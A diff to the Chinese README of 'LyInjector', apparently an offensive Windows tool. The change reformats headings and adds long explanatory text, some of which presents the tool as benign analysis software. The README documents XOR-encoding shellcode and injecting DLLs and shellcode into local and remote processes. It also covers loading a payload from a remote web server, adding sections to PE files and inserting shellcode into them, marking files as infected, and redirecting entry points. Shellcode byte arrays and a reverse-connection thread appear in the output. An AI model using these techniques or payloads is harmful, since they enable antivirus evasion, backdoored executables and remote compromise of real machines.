@@ -179,7 +179,7 @@ C:\Users\admin> LyInjector FormatFile --path d://shellcode.txt --output d://outp
 [+] 已储存 => d://output.txt
 ```
 
-- Xor 将文本中压缩后的字节数组进行异或并输出
+**Xor** 将文本中压缩后的字节数组进行异或并输出，它可将文本中压缩后的字节数组进行异或操作，并输出结果。通过Xor，用户可以对一些加密或压缩后的数据进行解密或解压缩，从而获得原始数据。异或操作是一种简单的位运算，可以对二进制数据进行加密和解密，常常被用于简单的加密算法中。Xor工具可以对文本中的字节数组进行异或操作，并输出解密后的结果，这对于一些需要对二进制数据进行处理的应用场景非常有用，比如恶意代码分析和加密算法破解等。需要注意的是，在进行异或操作时，需要使用相同的密钥或密钥序列，才能正确地进行加密和解密操作。
 
 ```c
 C:\Users\admin> LyInjector Xor --path d://output.txt --passwd lyshark
@@ -187,7 +187,7 @@ C:\Users\admin> LyInjector Xor --path d://output.txt --passwd lyshark
 % &{{%ssssssuspr'quw{!vqps{!vqs {z&v{!vqrwpr%%s%!tw"qu{!tqq{%s!v"qvuu"ssvp%%'v
 ```
 
-- Xchg 将压缩后的字符串转为字节数组格式
+**Xchg** 将压缩后的字符串转为字节数组格式，它可以将压缩后的字符串转为字节数组格式。通过Xchg，用户可以将压缩后的字符串转换为字节数组格式，以便于在程序中进行处理和使用。字节数组是一种在计算机中常用的数据类型，它可以表示二进制数据和字符数据，并且可以直接在内存中进行操作。将压缩后的字符串转换为字节数组格式，可以使得程序更加高效地处理数据，并且可以方便地进行一些加密和解密操作。Xchg工具通常被用于恶意代码分析和加密算法破解等领域，帮助用户更好地处理和分析二进制数据。需要注意的是，在进行转换时，需要确保字节数组的长度和压缩后的字符串长度一致，以避免数据丢失或错误。
 ```c
 C:\Users\admin> LyInjector Xchg --input d://output.txt --output d://array.txt
 [+] 字节已转为双字节
@@ -198,7 +198,7 @@ C:\Users\admin> LyInjector Xchg --input d://output.txt --output d://array.txt
 "\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
 ```
 
-- XorArray 将字节数组加密/解密为字节数组格式
+**XorArray** 将字节数组加密或解密为字节数组格式，它可以将字节数组进行加密或解密，并输出加密或解密后的结果。通过XorArray，用户可以对字节数组进行简单的加密和解密操作，以保护数据的安全性。在进行加密或解密操作时，XorArray会使用特定的密钥对字节数组进行异或操作，从而生成加密或解密后的结果。由于异或操作是一种简单的位运算，因此XorArray可以非常高效地完成加密或解密操作，并且可以用于处理大量的数据。XorArray工具通常被用于网络安全和加密算法领域，帮助用户更好地保护数据的安全性，并且防止数据被篡改或窃取。需要注意的是，在进行加密或解密操作时，需要使用相同的密钥才能正确地进行加密和解密操作，否则将无法还原原始数据。
 
 ```c
 "\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52"
@@ -212,7 +212,7 @@ unsigned char ShellCode[] =
 "\xf6\xe1\x15\x29\x43\x10\xbc\x96";
 ```
 
-- InjectDLL 注入DLL模块到特定进程内
+**InjectDLL** 注入DLL模块到特定进程内，它可以将DLL模块注入到特定进程的内存空间中，使得进程可以调用该DLL模块的函数。通过InjectDLL，用户可以在运行的进程中注入自己编写的DLL模块，从而实现一些自定义的功能，比如监视进程的行为、记录进程的日志、实现调试功能等等。在进行注入操作时，InjectDLL会使用一些特定的技术，比如远程线程注入、代码注入等等，从而将DLL模块注入到目标进程的内存空间中。需要注意的是，注入DLL模块可能会对目标进程造成一些不良影响，比如导致进程崩溃、降低进程的性能等等，因此在使用InjectDLL时需要谨慎操作，避免对系统造成不必要的损害。
 
 ```c
 C:\Users\admin> LyInjector InjectDLL --proc lyshark.exe --dll d://hook.dll
@@ -220,7 +220,7 @@ C:\Users\admin> LyInjector InjectDLL --proc lyshark.exe --dll d://hook.dll
 [*] 模块 [ d://hook.dll ] 已被注入到 [ 6624 ] 进程
 ```
 
-- InjectSelfShell 注入字符串到自身进程并运行
+**InjectSelfShell** 注入ShellCode字符串到自身进程并运行，，它可以将ShellCode字符串注入到自身进程的内存空间中，并运行该ShellCode。通过InjectSelfShell，用户可以在自身进程中运行一些自定义的ShellCode，从而实现一些特定的功能，比如打开一个网络连接、执行一些系统命令等等。在进行注入操作时，InjectSelfShell会将ShellCode字符串转换为二进制形式，并将其写入自身进程的内存空间中，然后通过一些特定的技术（如跳转指令）来调用该ShellCode。需要注意的是，注入ShellCode可能会对自身进程造成一些不良影响，比如导致进程崩溃、被杀毒软件误判等等，因此在使用InjectSelfShell时需要谨慎操作，避免对系统造成不必要的损害。
 
 ```c
 C:\Users\admin> LyInjector InjectSelfShell --shellcode fce88f00002c201...
@@ -228,7 +228,7 @@ C:\Users\admin> LyInjector InjectSelfShell --shellcode fce88f00002c201...
 [+] 解码地址: 19db64
 ```
 
-- InjectArrayByte 将字节数组注入到自身进程内
+**InjectArrayByte** 将字节数组注入到自身进程内，它可以将字节数组注入到自身进程的内存空间中，从而实现一些自定义的功能。
 
 ```c
 "\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30"
@@ -241,7 +241,7 @@ C:\Users\admin> LyInjector InjectArrayByte --path d://shellcode.txt
 [+] 解码地址: 19df20
 ```
 
-- FileInjectShell 将一行字符串注入到自身进程内
+**FileInjectShell** 将一行字符串注入到自身进程内
 
 ```c
 fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01...
@@ -251,7 +251,7 @@ C:\Users\admin> LyInjector FileInjectShell --path d://output_shellcode.txt
 [+] 解码地址: 19df20
 ```
 
-- InjectWebShell 从远程Web服务器加载字符串并注入到自身进程内
+**InjectWebShell** 从远程Web服务器加载字符串并注入到自身进程内
 
 ```c
 192.168.1.100:80/shellcode.raw
@@ -260,7 +260,7 @@ fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1
 C:\Users\admin> LyInjector InjectWebShell --address 192.168.1.100 --payload shellcode.raw
 ```
 
-- EncodeInFile 直接注入加密后的攻击载荷到自身进程内
+**EncodeInFile** 直接注入加密后的攻击载荷到自身进程内
 
 ```c
 C:\Users\admin> LyInjector Xor --path d://output_shellcode.txt --passwd lyshark
@@ -274,7 +274,7 @@ C:\Users\admin> LyInjector EncodeInFile --path d://xor_shellcode.txt --passwd ly
 [*] 激活当前反弹线程 => 2a60000
 ```
 
-- InjectProcShell 注入攻击载荷到远程进程
+**InjectProcShell** 注入攻击载荷到远程进程
 
 ```c
 C:\Users\admin> LyInjector InjectProcShell --pid 13372 --shellcode fce88f0000006031d2648b523089e...
@@ -285,7 +285,7 @@ C:\Users\admin> LyInjector InjectProcShell --pid 13372 --shellcode fce88f0000006
 [*] 创建线程ID => 352
 ```
 
-- EncodePidInFile 注入加密后的攻击载荷
+**EncodePidInFile** 注入加密后的攻击载荷
 
 ```c
 % &{{%ssssssuspr'quw{!vqps{z&v{!vqs {!vqrw{!tqq{pr%%s%!tw"qupr s" p urt sqq qs r %s'sr 
@@ -300,7 +300,7 @@ C:\Users\admin> LyInjector EncodePidInFile --pid 8384 --path d://xor_shellcode.t
 [*] 创建线程ID => 356
 ```
 
-- AddSection 在PE文件中新增一个节区
+**AddSection** 在PE文件中新增一个节区
 
 ```c
 C:\Users\admin> LyInjector AddSection --path d://lyshark.exe --section .hack --size 1024
@@ -315,7 +315,7 @@ C:\Users\admin> LyInjector AddSection --path d://lyshark.exe --section .hack --s
 [*] 节的文件起始位置: 0x000A7000 => DEC: 684032
 ```
 
-- InsertShellCode 将ShellCode插入到PE中的指定位置
+**InsertShellCode** 将ShellCode插入到PE中的指定位置
 
 ```c
 C:\Users\admin> LyInjector InsertShellCode --path d://lyshark.exe 
@@ -329,7 +329,7 @@ C:\Users\admin> LyInjector InsertShellCode --path d://lyshark.exe
 [+] 注入起始FOA => 0x000004D1 <DEC = 1233 > 注入结束FOA => 0x000004F8 <DEC = 1272 >
 ```
 
-- SetSigFlag 设置文件感染标志
+**SetSigFlag** 设置文件感染标志
 
 ```c
 C:\Users\admin> LyInjector SetSigFlag --path d://lyshark.exe
@@ -339,7 +339,7 @@ C:\Users\admin> LyInjector SetSigFlag --path d://lyshark.exe
 [-] 文件已被感染,无法重复感染.
 ```
 
-- RepairShellOep 在ShellCode末尾增加跳转回原地址处的指令
+**RepairShellOep** 在ShellCode末尾增加跳转回原地址处的指令
 
 ```c
 C:\Users\admin>LyInjector RepairShellOep --path d://lyshark.exe 
